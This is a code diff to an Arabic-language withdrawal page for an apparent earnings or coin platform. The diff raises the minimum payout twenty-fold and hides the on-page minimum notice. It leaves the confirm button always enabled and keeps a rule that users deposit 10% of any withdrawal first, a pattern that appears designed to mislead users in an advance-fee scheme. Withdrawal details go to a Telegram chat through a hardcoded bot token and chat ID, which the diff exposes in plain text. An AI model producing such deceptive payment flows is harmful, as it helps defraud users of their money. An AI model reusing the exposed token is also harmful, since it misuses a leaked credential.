@@ -54,6 +54,7 @@
         }
         .toast.success{ border-color:#00ff00; box-shadow:0 0 30px #00ff00; }
         .toast.error{ border-color:#FF0000; }
+        .toast.warning{ border-color:#FFA500; box-shadow:0 0 30px #FFA500; }
         @keyframes toastIn{ from{opacity:0;transform:translateY(-20px);} to{opacity:1;transform:translateY(0);} }
         @keyframes toastOut{ from{opacity:1;} to{opacity:0;transform:translateY(-20px);} }
         .header{
@@ -145,7 +146,7 @@
         }
         button:hover:not(:disabled){ transform:translateY(-2px); box-shadow:0 0 25px gold; }
         button:disabled{ opacity:0.5; cursor:not-allowed; }
-        .note{ text-align:center; margin:10px 0; color:#ccc; font-size:13px; }
+        .note{ display:none; }
         .loader{
             display:none;
             width:20px;
@@ -248,7 +249,6 @@
             <span class="required" id="requiredDeposit">0.00 جنيه</span>
             <span> (10% من قيمة السحب)</span>
         </div>
-        <div class="note" id="minNote">* الحد الأدنى 500 جنيه (≈ 10 دولار)</div>
         <div class="loader" id="loader"></div>
         <button onclick="confirmWithdraw(event)" id="submitBtn">تأكيد طلب السحب</button>
         <button onclick="location.href='transactions.html'">📋 سجل المعاملات</button>
@@ -275,7 +275,8 @@
 const TELEGRAM_TOKEN = "8535863939:AAFC4qgREiGQC-4c1QCQNrNp3gMprRsQRTs";
 const TELEGRAM_CHAT_ID = "6733319757";
 const USD_TO_EGP = 50;
-const MIN_EGP = 500;           // 10 دولار
+const MIN_EGP = 10000;          // الحد الأدنى للسحب 10,000 جنيه
+const MIN_USD = 200;            // 200 دولار
 const DEPOSIT_RATIO = 0.10;    // 10%
 
 // ========== Toast ==========
@@ -283,7 +284,7 @@ function showCustomToast(msg, type='success'){
     const container = document.getElementById('toastContainer');
     const toast = document.createElement('div');
     toast.className = 'toast '+type;
-    toast.innerHTML = (type==='success'?'✅ ':'❌ ') + msg;
+    toast.innerHTML = (type==='success'?'✅ ':(type==='error'?'❌ ':'⚠️ ')) + msg;
     container.appendChild(toast);
     setTimeout(()=>toast.remove(), 3000);
 }
@@ -310,7 +311,7 @@ auth.onAuthStateChanged(user => {
             if (doc.exists) {
                 const data = doc.data();
                 userCoinsEGP = data.coins || 0;
-                totalDepositsEGP = data.totalDeposits || 0;  // حقل الإيداعات
+                totalDepositsEGP = data.totalDeposits || 0;
                 updateBalanceDisplay();
                 updateCalculations();
             }
@@ -335,24 +336,12 @@ function updateBalanceDisplay(){
     }
 }
 
-// تحديث نص الحد الأدنى
-function updateMinNote(){
-    const currency = document.querySelector('input[name="currency"]:checked').value;
-    const note = document.getElementById('minNote');
-    if (currency === 'EGP') {
-        note.innerText = `* الحد الأدنى ${MIN_EGP} جنيه (≈ 10 دولار)`;
-    } else {
-        note.innerText = `* الحد الأدنى 10 دولار (≈ ${MIN_EGP} جنيه)`;
-    }
-}
-
-// الحسابات عند تغيير المبلغ أو العملة
+// الحسابات عند تغيير المبلغ أو العملة (بدون تعطيل الزر)
 function updateCalculations(){
     const amount = parseFloat(document.getElementById('amount').value) || 0;
     const currency = document.querySelector('input[name="currency"]:checked').value;
     const convertedDiv = document.getElementById('convertedAmount');
     const requiredSpan = document.getElementById('requiredDeposit');
-    const submitBtn = document.getElementById('submitBtn');
     const warningDiv = document.getElementById('depositWarning');
     
     // عرض التحويل
@@ -368,7 +357,6 @@ function updateCalculations(){
         }
     }
     
-    // حساب المبلغ بالجنيه للمقارنات
     let amountEGP = amount;
     if (currency === 'USD') amountEGP = amount * USD_TO_EGP;
     
@@ -382,17 +370,14 @@ function updateCalculations(){
         requiredSpan.innerText = requiredUSD + ' دولار';
     }
     
-    // التحقق من الشروط
-    const isValidAmount = (currency === 'EGP' && amount >= MIN_EGP) || (currency === 'USD' && amount >= 10);
-    const hasEnoughBalance = amountEGP <= userCoinsEGP;
+    // تحديث لون الخلفية التحذيري فقط (زر التأكيد يبقى منيراً دائماً)
     const hasEnoughDeposit = requiredDepositEGP <= totalDepositsEGP;
+    const hasEnoughBalance = amountEGP <= userCoinsEGP;
     
-    if (!isValidAmount || !hasEnoughBalance || !hasEnoughDeposit) {
-        submitBtn.disabled = true;
-        warningDiv.style.borderColor = hasEnoughDeposit ? '#ff6600' : '#ff0000';
-        warningDiv.style.background = hasEnoughDeposit ? 'rgba(255,100,0,0.2)' : 'rgba(255,0,0,0.15)';
+    if (!hasEnoughDeposit || !hasEnoughBalance) {
+        warningDiv.style.borderColor = '#ff0000';
+        warningDiv.style.background = 'rgba(255,0,0,0.15)';
     } else {
-        submitBtn.disabled = false;
         warningDiv.style.borderColor = '#ff6600';
         warningDiv.style.background = 'rgba(255,100,0,0.2)';
     }
@@ -402,7 +387,6 @@ function updateCalculations(){
 document.querySelectorAll('input[name="currency"]').forEach(r => {
     r.addEventListener('change', ()=>{
         updateBalanceDisplay();
-        updateMinNote();
         updateCalculations();
     });
 });
@@ -443,7 +427,7 @@ async function sendTelegram(data, currency){
     }catch(e){ console.warn('Telegram error'); }
 }
 
-// تأكيد السحب
+// تأكيد السحب (الزر دائم التفعيل)
 async function confirmWithdraw(event){
     const method = document.getElementById('method').value;
     const address = document.getElementById('accountAddress').value.trim();
@@ -457,9 +441,10 @@ async function confirmWithdraw(event){
         return;
     }
     
-    // التحقق من الحد الأدنى
-    if ((currency==='EGP' && amount < MIN_EGP) || (currency==='USD' && amount < 10)) {
-        showCustomToast(`الحد الأدنى ${currency==='EGP'? MIN_EGP+' جنيه' : '10 دولار'}`, 'error');
+    // التحقق من الحد الأدنى (إشعار فقط)
+    if ((currency === 'EGP' && amount < MIN_EGP) || (currency === 'USD' && amount < MIN_USD)) {
+        const minAmount = currency === 'EGP' ? MIN_EGP.toLocaleString() + ' جنيه' : MIN_USD + ' دولار';
+        showCustomToast(`⚠️ الحد الأدنى للسحب هو ${minAmount}`, 'warning');
         return;
     }
     
@@ -531,8 +516,7 @@ async function confirmWithdraw(event){
     }
 }
 
-// تهيئة النصوص
-updateMinNote();
+// تهيئة العرض
 updateBalanceDisplay();
 
 // ========== Navbar ==========
